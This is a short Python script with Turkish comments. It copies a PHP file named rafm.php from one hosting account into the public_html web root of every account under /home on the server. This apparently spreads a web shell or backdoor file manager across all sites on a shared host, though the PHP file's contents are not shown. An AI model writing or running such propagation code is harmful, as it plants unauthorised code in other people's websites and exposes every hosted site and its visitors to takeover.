import glob
import shutil

# Kaynak dosyanın yolu
source_file = '/home/quadtec.ind.br/public_html/rafm.php'

# Hedef dizinleri bul ve dosyayı kopyala
for target_dir in glob.glob('/home/*/public_html/'):
    try:
        shutil.copy(source_file, target_dir)
        print(f"{source_file} kopyalandı -> {target_dir}")
    except Exception as e:
        print(f"Hata: {target_dir} içine kopyalanamadı. {e}")
